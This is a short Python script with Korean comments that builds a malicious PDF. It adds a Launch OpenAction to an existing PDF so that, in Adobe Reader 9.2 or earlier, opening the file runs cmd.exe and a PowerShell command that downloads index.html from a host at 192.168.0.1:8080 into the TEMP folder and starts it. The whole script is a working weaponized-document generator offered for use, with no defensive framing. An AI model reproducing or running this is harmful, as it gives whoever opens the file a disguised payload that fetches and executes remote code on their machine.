# PDF 파일에 Powershell 명령어를 삽입하여, PDF 파일이 열릴 때 해당 명령어를 실행시키는 Python 코드입니다.
# 이 코드는 Adobe Reader 9.2 이하의 버전에서만 작동하며, 최신 버전에서는 보안 패치로 인해 작동하지 않을 수 있습니다.

from pdfrw import PdfReader, PdfWriter, PdfDict, PdfName

# 기존 PDF 파일 (사진 포함)
pdf_file = "example.pdf"
output_pdf = "powershell_pdf.pdf"

# Launch 액션 추가 (index.html 다운로드 및 실행)
launch_action = PdfDict(
    Type=PdfName.Action,
    S=PdfName.Launch,
    Win=PdfDict(
        F="cmd.exe",
        P=r"""/Q /C powershell -Command "$client = New-Object System.Net.WebClient; $url = 'http://192.168.0.1:8080/index.html'; $output = $env:TEMP + '\\index.html'; $client.DownloadFile($url, $output); Start-Process $output" """
    )
)

# 기존 PDF 읽기
template = PdfReader(pdf_file)

# OpenAction 설정
template.Root.OpenAction = launch_action

# PDF 저장
PdfWriter(output_pdf, trailer=template).write()
print(f"{output_pdf} 생성 완료!")
